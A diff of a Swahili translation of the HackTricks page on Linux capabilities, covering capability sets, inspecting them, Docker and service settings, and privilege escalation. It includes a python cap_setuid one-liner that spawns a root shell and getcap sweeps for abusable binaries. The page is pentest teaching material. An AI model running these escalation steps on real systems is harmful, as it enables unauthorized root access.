@@ -1,58 +1,60 @@
-# Uwezo wa Linux
+# Linux Capabilities
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Uhispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila fani.\\
+​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **lengo la kukuza maarifa ya kiufundi**, kongamano hili ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila taaluma.\\
 
 {% embed url="https://www.rootedcon.com/" %}
 
-## Uwezo wa Linux
+## Linux Capabilities
 
-Uwezo wa Linux hugawa **mamlaka ya mizizi katika vitengo vidogo na tofauti**, kuruhusu michakato kuwa na sehemu ya uwezo. Hii inapunguza hatari kwa kutokupa mamlaka kamili ya mizizi bila sababu.
+Linux capabilities zinagawanya **privileges za root katika vitengo vidogo, tofauti**, kuruhusu michakato kuwa na subset ya privileges. Hii inapunguza hatari kwa kutokupa privileges za root kamili bila sababu.
 
 ### Tatizo:
-- Watumiaji wa kawaida wana idhini ndogo, ikionyesha kazi kama kufungua soketi ya mtandao ambayo inahitaji ufikiaji wa mizizi.
+- Watumiaji wa kawaida wana ruhusa ndogo, ikihusisha kazi kama kufungua socket ya mtandao ambayo inahitaji ufikiaji wa root.
 
 ### Seti za Uwezo:
 
-1. **Imeorodheshwa (CapInh)**:
-- **Lengo**: Inaamua uwezo unaopitishwa kutoka kwa mchakato mzazi.
-- **Ufanisi**: Wakati mchakato mpya unapoundwa, unarithi uwezo kutoka kwa mzazi wake katika seti hii. Inafaa kwa kudumisha uwezo fulani kwa michakato inayozaliwa.
+1. **Inherited (CapInh)**:
+- **Madhumuni**: Inabainisha uwezo unaopitishwa kutoka kwa mchakato wa mzazi.
+- **Ufanisi**: Wakati mchakato mpya unaundwa, unarithi uwezo kutoka kwa mzazi katika seti hii. Ni muhimu kwa kudumisha privileges fulani wakati wa kuzaliwa kwa michakato.
 - **Vikwazo**: Mchakato hauwezi kupata uwezo ambao mzazi wake hakuwa nao.
 
-2. **Halisi (CapEff)**:
-- **Lengo**: Inawakilisha uwezo halisi ambao mchakato unatumia wakati wowote.
-- **Ufanisi**: Ni seti ya uwezo ambayo kernel inachunguza ili kutoa idhini kwa shughuli mbalimbali. Kwa faili, seti hii inaweza kuwa alama inayoonyesha ikiwa uwezo ulioruhusiwa wa faili unapaswa kuzingatiwa kuwa halisi.
-- **Umuhimu**: Seti halisi ni muhimu kwa ukaguzi wa mamlaka mara moja, ikifanya kama seti ya uwezo ya aktive ambayo mchakato unaweza kutumia.
+2. **Effective (CapEff)**:
+- **Madhumuni**: Inawakilisha uwezo halisi ambao mchakato unatumia wakati wowote.
+- **Ufanisi**: Ni seti ya uwezo inayokaguliwa na kernel ili kutoa ruhusa kwa shughuli mbalimbali. Kwa faili, seti hii inaweza kuwa bendera inayoashiria kama uwezo wa faili unaruhusiwa kuzingatiwa kuwa halisi.
+- **Umuhimu**: Seti halisi ni muhimu kwa ukaguzi wa haraka wa privileges, ikifanya kazi kama seti ya uwezo inayotumika ambayo mchakato unaweza kutumia.
 
-3. **Kuruhusiwa (CapPrm)**:
-- **Lengo**: Inafafanua seti kubwa ya uwezo ambao mchakato unaweza kuwa nao.
-- **Ufanisi**: Mchakato unaweza kuinua uwezo kutoka kwa seti iliyoruhusiwa hadi seti yake halisi, ikimpa uwezo wa kutumia uwezo huo. Pia inaweza kuondoa uwezo kutoka kwa seti iliyoruhusiwa.
-- **Kizuizi**: Inafanya kama kiwango cha juu cha uwezo ambao mchakato unaweza kuwa nao, ikahakikisha mchakato haupiti kikomo kilichopangwa cha mamlaka.
+3. **Permitted (CapPrm)**:
+- **Madhumuni**: Inabainisha seti ya juu ya uwezo ambayo mchakato unaweza kuwa nayo.
+- **Ufanisi**: Mchakato unaweza kuinua uwezo kutoka kwa seti inayoruhusiwa hadi seti yake halisi, ikimpa uwezo wa kutumia uwezo huo. Pia inaweza kuondoa uwezo kutoka kwa seti yake inayoruhusiwa.
+- **Mipaka**: Inafanya kazi kama kikomo cha juu kwa uwezo ambao mchakato unaweza kuwa nao, kuhakikisha mchakato hauzidi wigo wa privileges ulioainishwa.
 
-4. **Kizuizi (CapBnd)**:
-- **Lengo**: Inaweka kikomo kwa uwezo ambao mchakato unaweza kupata wakati wa mzunguko wake wa maisha.
-- **Ufanisi**: Hata ikiwa mchakato una uwezo fulani katika seti yake ya kurithiwa au kuruhusiwa, hauwezi kupata uwezo huo isipokuwa pia uko katika seti ya kizuizi.
-- **Matumizi**: Seti hii ni muhimu hasa kwa kuzuia uwezekano wa mchakato kuongeza mamlaka yake, ikiongeza safu ya ziada ya usalama.
+4. **Bounding (CapBnd)**:
+- **Madhumuni**: Inweka kikomo juu ya uwezo ambao mchakato unaweza kupata wakati wa maisha yake.
+- **Ufanisi**: Hata kama mchakato una uwezo fulani katika seti yake inayorithiwa au inayoruhusiwa, hauwezi kupata uwezo huo isipokuwa pia uko katika seti ya bounding.
+- **Matumizi**: Seti hii ni muhimu kwa kupunguza uwezo wa mchakato kupandisha privileges, ikiongeza safu ya ziada ya usalama.
 
-5. **Mazingira (CapAmb)**:
-- **Lengo**: Inaruhusu uwezo fulani kuendelea kuwepo kupitia wito wa mfumo wa `execve`, ambao kwa kawaida ungefanya mchakato urejeshwe kabisa kwa uwezo wake. 
-- **Ufanisi**: Inahakikisha kuwa programu zisizo na SUID ambazo hazina uwezo wa faili zinaweza kuendelea kuwa na uwezo fulani.
-- **Vikwazo**: Uwezo katika seti hii unazingatia vikwazo vya seti za kurithiwa na kuruhusiwa, ikihakikisha kuwa hauzidi mamlaka yanayoruhusiwa kwa mchakato.
+5. **Ambient (CapAmb)**:
+- **Madhumuni**: Inaruhusu uwezo fulani kudumishwa wakati wa wito wa mfumo wa `execve`, ambao kwa kawaida ungepelekea upya kamili wa uwezo wa mchakato.
+- **Ufanisi**: Inahakikisha kwamba programu zisizo za SUID ambazo hazina uwezo wa faili zinazohusiana zinaweza kudumisha privileges fulani.
+- **Vikwazo**: Uwezo katika seti hii unategemea vikwazo vya seti zinazorithiwa na zinazoruhusiwa, kuhakikisha hazipiti privileges zinazoruhusiwa za mchakato.
 ```python
 # Code to demonstrate the interaction of different capability sets might look like this:
 # Note: This is pseudo-code for illustrative purposes only.
@@ -62,29 +64,29 @@ process.add_capability_to_set('CapPrm', 'new_capability')
 process.limit_capabilities('CapBnd')
 process.preserve_capabilities_across_execve('CapAmb')
 ```
-Kwa habari zaidi angalia:
+Kwa maelezo zaidi angalia:
 
 * [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
 * [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
 
-## Uwezo wa Mchakato na Programu
+## Uwezo wa Mchakato & Binaries
 
 ### Uwezo wa Mchakato
 
-Ili kuona uwezo wa mchakato fulani, tumia faili ya **status** katika saraka ya /proc. Kwa kuwa inatoa maelezo zaidi, hebu tuweke kikomo kwenye habari zinazohusiana na uwezo wa Linux.\
-Tafadhali kumbuka kuwa kwa habari za uwezo wa mchakato zinahifadhiwa kwa kila mchakato, kwa programu katika mfumo wa faili inahifadhiwa kwa sifa zilizopanuliwa.
+Ili kuona uwezo wa mchakato maalum, tumia faili ya **status** katika saraka ya /proc. Kwa kuwa inatoa maelezo zaidi, hebu tuipunguze kwa habari inayohusiana na uwezo wa Linux.\
+Kumbuka kwamba kwa mchakato wote unaotembea, habari ya uwezo inahifadhiwa kwa kila thread, kwa binaries katika mfumo wa faili inahifadhiwa katika sifa za kupanuliwa.
 
-Unaweza kupata uwezo uliowekwa katika /usr/include/linux/capability.h
+Unaweza kupata uwezo ulioainishwa katika /usr/include/linux/capability.h
 
-Unaweza kupata uwezo wa mchakato wa sasa kwa kutumia `cat /proc/self/status` au kwa kufanya `capsh --print`, na wa watumiaji wengine katika `/proc/<pid>/status`
+Unaweza kupata uwezo wa mchakato wa sasa katika `cat /proc/self/status` au kufanya `capsh --print` na wa watumiaji wengine katika `/proc/<pid>/status`
 ```bash
 cat /proc/1234/status | grep Cap
 cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
 ```
-Amri hii inapaswa kurudisha mistari 5 kwenye mifumo mingi.
+Hii amri inapaswa kurudisha mistari 5 kwenye mifumo mingi.
 
-* CapInh = Uwezo uliorithiwa
-* CapPrm = Uwezo ulioruhusiwa
+* CapInh = Uwezo ulio urithiwa
+* CapPrm = Uwezo ulio ruhusiwa
 * CapEff = Uwezo halisi
 * CapBnd = Seti ya mipaka
 * CapAmb = Seti ya uwezo wa mazingira
@@ -96,14 +98,12 @@ CapEff: 0000003fffffffff
 CapBnd: 0000003fffffffff
 CapAmb: 0000000000000000
 ```
-## Linux Uwezo wa Kuongeza Uwezo
-
-Kwa kutumia kifaa cha capsh, tunaweza kubadilisha nambari hizi za hexadecimali kuwa majina ya uwezo.
+Hizi nambari za hexadecimal hazina maana. Kwa kutumia zana ya capsh tunaweza kuzifasiri kuwa majina ya uwezo.
 ```bash
 capsh --decode=0000003fffffffff
 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
 ```
-Hebu angalia sasa **uwezo** unaotumiwa na `ping`:
+Hebu tuangalia sasa **uwezo** unaotumiwa na `ping`:
 ```bash
 cat /proc/9491/status | grep Cap
 CapInh:    0000000000000000
@@ -115,11 +115,11 @@ CapAmb:    0000000000000000
 capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-Ingawa hiyo inafanya kazi, kuna njia nyingine rahisi zaidi. Ili kuona uwezo wa mchakato unaofanya kazi, tumia tu zana ya **getpcaps** ikifuatiwa na kitambulisho cha mchakato (PID). Unaweza pia kutoa orodha ya vitambulisho vya mchakato.
+Ingawa hiyo inafanya kazi, kuna njia nyingine na rahisi. Ili kuona uwezo wa mchakato unaoendesha, tumia tu chombo cha **getpcaps** ikifuatiwa na kitambulisho chake cha mchakato (PID). Unaweza pia kutoa orodha ya vitambulisho vya michakato.
 ```bash
 getpcaps 1234
 ```
-Hebu angalia hapa uwezo wa `tcpdump` baada ya kumpa faili ya binary uwezo wa kutosha (`cap_net_admin` na `cap_net_raw`) ili kusikiliza mtandao (_tcpdump inaendeshwa katika mchakato 9562_):
+Hebu tuangalia hapa uwezo wa `tcpdump` baada ya kumpa binary uwezo wa kutosha (`cap_net_admin` na `cap_net_raw`) ili kunusa mtandao (_tcpdump inakimbia katika mchakato 9562_):
 ```bash
 #The following command give tcpdump the needed capabilities to sniff traffic
 $ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
@@ -137,42 +137,42 @@ CapAmb:    0000000000000000
 $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-Kama unavyoona uwezo uliotolewa unalingana na matokeo ya njia 2 za kupata uwezo wa faili.\
-Zana ya _getpcaps_ hutumia wito wa mfumo wa **capget()** kuuliza uwezo uliopo kwa mchakato fulani. Wito huu wa mfumo unahitaji tu kutoa PID ili kupata habari zaidi.
+Kama unavyoona, uwezo uliopewa unalingana na matokeo ya njia 2 za kupata uwezo wa binary.\
+Zana ya _getpcaps_ inatumia wito wa mfumo wa **capget()** kuuliza uwezo unaopatikana kwa nyuzi maalum. Wito huu wa mfumo unahitaji tu kutoa PID ili kupata maelezo zaidi.
 
-### Uwezo wa Faili za Kutekelezwa
+### Uwezo wa Binaries
 
-Faili za kutekelezwa zinaweza kuwa na uwezo ambao unaweza kutumiwa wakati wa utekelezaji. Kwa mfano, ni kawaida sana kupata faili ya `ping` na uwezo wa `cap_net_raw`:
+Binaries zinaweza kuwa na uwezo ambao unaweza kutumika wakati wa kutekeleza. Kwa mfano, ni kawaida sana kupata binary ya `ping` ikiwa na uwezo wa `cap_net_raw`:
 ```bash
 getcap /usr/bin/ping
 /usr/bin/ping = cap_net_raw+ep
 ```
-Unaweza **kutafuta faili za binary zenye uwezo** kwa kutumia:
+Unaweza **kutafuta binaries zenye uwezo** kwa kutumia:
 ```bash
 getcap -r / 2>/dev/null
 ```
-### Kupunguza uwezo kwa kutumia capsh
+### Kutupa uwezo na capsh
 
-Ikiwa tunapunguza uwezo wa CAP\_NET\_RAW kwa _ping_, basi zana ya ping haipaswi tena kufanya kazi.
+Ikiwa tutatua uwezo wa CAP\_NET\_RAW kwa _ping_, basi matumizi ya ping hayapaswi kufanya kazi tena.
 ```bash
 capsh --drop=cap_net_raw --print -- -c "tcpdump"
 ```
-Isipokuwa matokeo ya _capsh_ yenyewe, amri ya _tcpdump_ yenyewe pia inapaswa kutoa kosa.
+Besides the output of _capsh_ itself, the _tcpdump_ command itself should also raise an error.
 
-> /bin/bash: /usr/sbin/tcpdump: Operesheni haikuruhusiwa
+> /bin/bash: /usr/sbin/tcpdump: Operation not permitted
 
-Kosa linaonyesha wazi kuwa amri ya ping haijiruhusu kufungua soketi ya ICMP. Sasa tunajua kwa uhakika kuwa hii inafanya kazi kama ilivyotarajiwa.
+The error clearly shows that the ping command is not allowed to open an ICMP socket. Now we know for sure that this works as expected.
 
 ### Ondoa Uwezo
 
-Unaweza kuondoa uwezo wa faili ya binary na
+You can remove capabilities of a binary with
 ```bash
 setcap -r </path/to/binary>
 ```
-## Uwezo wa Mtumiaji
+## User Capabilities
 
-Inaonekana **niwezekana pia kumtumia mtumiaji uwezo**. Hii inamaanisha kwamba kila mchakato uliofanywa na mtumiaji utaweza kutumia uwezo wa mtumiaji.\
-Kulingana na [hii](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [hii](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html), na [hii](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), inahitajika kusanidi faili kadhaa ili kumpa mtumiaji uwezo fulani, lakini faili inayoweka uwezo kwa kila mtumiaji itakuwa `/etc/security/capability.conf`.\
+Kwa kweli **inawezekana kutoa uwezo pia kwa watumiaji**. Hii ina maana kwamba kila mchakato unaotekelezwa na mtumiaji ataweza kutumia uwezo wa watumiaji.\
+Kulingana na [hii](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [hii](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) na [hii](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) faili chache mpya zinahitaji kusanidiwa ili kumpa mtumiaji uwezo fulani lakini ile inayotoa uwezo kwa kila mtumiaji itakuwa `/etc/security/capability.conf`.\
 Mfano wa faili:
 ```bash
 # Simple
@@ -187,9 +187,9 @@ cap_net_admin,cap_net_raw    jrnetadmin
 # Combining names and numerics
 cap_sys_admin,22,25          jrsysadmin
 ```
-## Uwezo wa Mazingira
+## Environment Capabilities
 
-Kwa kuchapisha programu ifuatayo, ni **inawezekana kuzindua kikao cha bash ndani ya mazingira yanayotoa uwezo**.
+Kwa kukusanya programu ifuatayo inawezekana **kuanzisha shell ya bash ndani ya mazingira yanayotoa uwezo**.
 
 {% code title="ambient.c" %}
 ```c
@@ -287,31 +287,31 @@ gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 ./ambient /bin/bash
 ```
-Ndani ya **bash inayotekelezwa na faili ya binary ya mazingira iliyoundwa**, niwezekanavyo kuona **uwezo mpya** (mtumiaji wa kawaida hatakuwa na uwezo wowote katika sehemu ya "sasa").
+Ndani ya **bash inayotekelezwa na binary ya mazingira iliyokusanywa** inawezekana kuona **uwezo mpya** (mtumiaji wa kawaida hatakuwa na uwezo wowote katika sehemu ya "sasa").
 ```bash
 capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
 {% hint style="danger" %}
-Unaweza **kuongeza uwezo tu ambao upo** katika seti zote mbili, yaani seti ya kuruhusiwa na seti ya kurithiwa.
+Unaweza **kuongeza tu uwezo ambao upo** katika seti za ruhusa na zinazorithishwa.
 {% endhint %}
 
-### Programu zenye uwezo wa uwezo/Programu zenye uwezo mdogo
+### Binaries zenye Uwezo/Binaries zisizo na Uwezo
 
-**Programu zenye uwezo wa uwezo hazitatumia uwezo mpya** uliotolewa na mazingira, hata hivyo **programu zenye uwezo mdogo zitatumia** uwezo huo kwani hazitakataa. Hii inafanya programu zenye uwezo mdogo kuwa hatarini ndani ya mazingira maalum yanayotoa uwezo kwa programu.
+**Binaries zenye uwezo hazitatumia uwezo mpya** uliopewa na mazingira, hata hivyo **binaries zisizo na uwezo zitawatumia** kwani hazitakataa. Hii inafanya binaries zisizo na uwezo kuwa hatarini ndani ya mazingira maalum yanayotoa uwezo kwa binaries.
 
 ## Uwezo wa Huduma
 
-Kwa chaguo-msingi, **huduma inayotumia akaunti ya root itapewa uwezo wote**, na kwa baadhi ya hali hii inaweza kuwa hatari.\
-Kwa hiyo, **faili ya usanidi wa huduma** inaruhusu **kutaja** **uwezo** unayotaka huduma hiyo kuwa nayo, **na** **mtumiaji** ambaye anapaswa kutekeleza huduma hiyo ili kuepuka kuendesha huduma na mamlaka zisizo za lazima.
+Kwa kawaida, **huduma inayotembea kama root itakuwa na uwezo wote uliotolewa**, na katika baadhi ya matukio hii inaweza kuwa hatari.\
+Kwa hivyo, faili ya **mipangilio ya huduma** inaruhusu **kueleza** **uwezo** unayotaka iwe nao, **na** **mtumiaji** anayepaswa kutekeleza huduma ili kuepuka kuendesha huduma yenye ruhusa zisizohitajika:
 ```bash
 [Service]
 User=bob
 AmbientCapabilities=CAP_NET_BIND_SERVICE
 ```
-## Uwezo katika Kontena za Docker
+## Uwezo katika Maktaba za Docker
 
-Kwa chaguo-msingi, Docker inaweka uwezo kadhaa kwa kontena. Ni rahisi sana kuangalia uwezo huu kwa kukimbia:
+Kwa default, Docker inatoa uwezo kadhaa kwa maktaba. Ni rahisi sana kuangalia ni uwezo gani hawa kwa kukimbia:
 ```bash
 docker run --rm -it  r.j3ss.co/amicontained bash
 Capabilities:
@@ -328,15 +328,15 @@ docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained 
 ```
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila fani.
+​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **lengo la kukuza maarifa ya kiufundi**, kongamano hili ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila taaluma.
 
 {% embed url="https://www.rootedcon.com/" %}
 
 ## Privesc/Container Escape
 
-Uwezo ni muhimu wakati unapotaka **kuzuia michakato yako mwenyewe baada ya kufanya shughuli za kipekee** (kwa mfano, baada ya kuanzisha chroot na kufunga soketi). Walakini, wanaweza kutumiwa vibaya kwa kusambaza amri au hoja zenye nia mbaya ambazo kisha zinatekelezwa kama mtumiaji mkuu.
+Uwezo ni muhimu unapohitaji **kuzuia michakato yako mwenyewe baada ya kufanya operesheni zenye mamlaka** (mfano, baada ya kuweka chroot na kuunganisha kwenye socket). Hata hivyo, zinaweza kutumika vibaya kwa kupitisha amri au hoja mbaya ambazo kisha zinafanywa kama root.
 
-Unaweza kulazimisha uwezo kwa programu kwa kutumia `setcap`, na kuuliza haya kwa kutumia `getcap`:
+Unaweza kulazimisha uwezo kwa programu kwa kutumia `setcap`, na kuuliza hizi kwa kutumia `getcap`:
 ```bash
 #Set Capability
 setcap cap_net_raw+ep /sbin/ping
@@ -345,15 +345,15 @@ setcap cap_net_raw+ep /sbin/ping
 getcap /sbin/ping
 /sbin/ping = cap_net_raw+ep
 ```
-`+ep` inamaanisha unaweka uwezo ("-" ingeondoa) kama Ufanisi na Kuruhusiwa.
+The `+ep` inamaanisha unongeza uwezo (“-” itauondoa) kama Ufanisi na Uidhinishwa.
 
-Kutambua programu katika mfumo au folda yenye uwezo:
+Ili kubaini programu katika mfumo au folda zenye uwezo:
 ```bash
 getcap -r / 2>/dev/null
 ```
-### Mfano wa Utekaji
+### Mfano wa Ukatili
 
-Katika mfano ufuatao, faili ya binary `/usr/bin/python2.6` imeonekana kuwa na udhaifu wa kusababisha ongezeko la mamlaka:
+Katika mfano ufuatao, binary `/usr/bin/python2.6` imepatikana kuwa na udhaifu wa privesc:
 ```bash
 setcap cap_setuid+ep /usr/bin/python2.7
 /usr/bin/python2.7 = cap_setuid+ep
@@ -361,67 +361,38 @@ setcap cap_setuid+ep /usr/bin/python2.7
 #Exploit
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
-**Uwezo** unaohitajika na `tcpdump` ili **kuruhusu mtumiaji yeyote kusikiliza pakiti**:
-
-```markdown
-To allow any user to sniff packets using `tcpdump`, the following capabilities need to be set:
-
-1. `CAP_NET_RAW`: This capability allows the user to create raw sockets, which is necessary for packet sniffing.
-
-To set these capabilities, you can use the `setcap` command as follows:
-
-```bash
-sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
-```
-
-This command sets the `CAP_NET_RAW` capability for the `tcpdump` binary located at `/usr/sbin/tcpdump`. With this capability set, any user will be able to run `tcpdump` and sniff packets.
-```
-```html
-<h2>Uwezo</h2> unaohitajika na <code>tcpdump</code> ili <strong>kuruhusu mtumiaji yeyote kusikiliza pakiti</strong>:
-
-<pre>
-Ili kuruhusu mtumiaji yeyote kusikiliza pakiti kwa kutumia <code>tcpdump</code>, uwezo ufuatao unahitajika kuwekwa:
-
-1. <code>CAP_NET_RAW</code>: Uwezo huu unaruhusu mtumiaji kuunda soketi za asili, ambayo ni muhimu kwa ajili ya kusikiliza pakiti.
-
-Ili kuweka uwezo huu, unaweza kutumia amri ya <code>setcap</code> kama ifuatavyo:
-
-<code>sudo setcap cap_net_raw=eip /usr/sbin/tcpdump</code>
-
-Amri hii inaweka uwezo wa <code>CAP_NET_RAW</code> kwa faili ya <code>tcpdump</code> iliyopo kwenye njia ya <code>/usr/sbin/tcpdump</code>. Kwa kuweka uwezo huu, mtumiaji yeyote ataweza kutumia <code>tcpdump</code> na kusikiliza pakiti.
-</pre>
-```
+**Uwezo** unaohitajika na `tcpdump` ili **kuruhusu mtumiaji yeyote kunusa pakiti**:
 ```bash
 setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
 getcap /usr/sbin/tcpdump
 /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
 ```
-### Kesi maalum ya uwezo "mtupu"
+### Hali maalum ya uwezo "bila"
 
-[Kutoka kwenye nyaraka](https://man7.org/linux/man-pages/man7/capabilities.7.html): Tafadhali kumbuka kuwa unaweza kumwezesha uwezo mtupu kwenye faili ya programu, na hivyo niwezekana kuunda programu ya set-user-ID-root ambayo inabadilisha set-user-ID ya mchakato unaoendesha programu kuwa 0, lakini haipati uwezo wowote kwa mchakato huo. Au, kwa maneno rahisi, ikiwa una faili ya binary ambayo:
+[Kutoka kwenye nyaraka](https://man7.org/linux/man-pages/man7/capabilities.7.html): Kumbuka kwamba mtu anaweza kupeana seti za uwezo zisizo na kitu kwa faili la programu, na hivyo inawezekana kuunda programu ya set-user-ID-root ambayo inabadilisha set-user-ID halisi na iliyohifadhiwa ya mchakato unaotekeleza programu hiyo kuwa 0, lakini haina uwezo wowote kwa mchakato huo. Au, kwa kusema kwa urahisi, ikiwa una binary ambayo:
 
-1. Haiomilikiwi na root
-2. Haina alama za `SUID`/`SGID` zilizowekwa
-3. Ina uwezo mtupu (kwa mfano: `getcap myelf` inarudi `myelf =ep`)
+1. haimilikiwi na root
+2. haina bits za `SUID`/`SGID` zilizowekwa
+3. ina seti za uwezo zisizo na kitu (mfano: `getcap myelf` inarudisha `myelf =ep`)
 
-basil **binary hiyo itaendeshwa kama root**.
+basi **hiyo binary itakimbia kama root**.
 
 ## CAP\_SYS\_ADMIN
 
-**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ni uwezo wenye nguvu sana wa Linux, mara nyingi unalinganishwa na kiwango cha karibu-cha-root kutokana na **uwezo wake mkubwa wa utawala**, kama vile kufunga vifaa au kubadilisha vipengele vya kernel. Ingawa ni muhimu kwa kontena zinazosimulisha mifumo nzima, **`CAP_SYS_ADMIN` ina changamoto kubwa za usalama**, hasa katika mazingira ya kontena, kutokana na uwezekano wake wa kuongeza uwezo na kuhatarisha usalama wa mfumo. Kwa hiyo, matumizi yake yanahitaji tathmini kali ya usalama na usimamizi wa tahadhari, na upendeleo mkubwa wa kuondoa uwezo huu katika kontena maalum ya programu ili kuzingatia **kanuni ya uwezo mdogo** na kupunguza eneo la shambulio.
+**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ni uwezo wa Linux wenye nguvu sana, mara nyingi unalinganishwa na kiwango cha karibu na root kutokana na **privileges za kiutawala** zake kubwa, kama vile kuunganisha vifaa au kubadilisha vipengele vya kernel. Ingawa ni muhimu kwa kontena zinazofanana na mifumo kamili, **`CAP_SYS_ADMIN` inatoa changamoto kubwa za usalama**, hasa katika mazingira ya kontena, kutokana na uwezo wake wa kupandisha hadhi na kuathiri mfumo. Kwa hivyo, matumizi yake yanahitaji tathmini kali za usalama na usimamizi waangalifu, huku kukiwa na upendeleo mkubwa wa kuondoa uwezo huu katika kontena maalum za programu ili kuzingatia **kanuni ya hadhi ndogo** na kupunguza uso wa shambulio.
 
 **Mfano na binary**
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_admin+ep
 ```
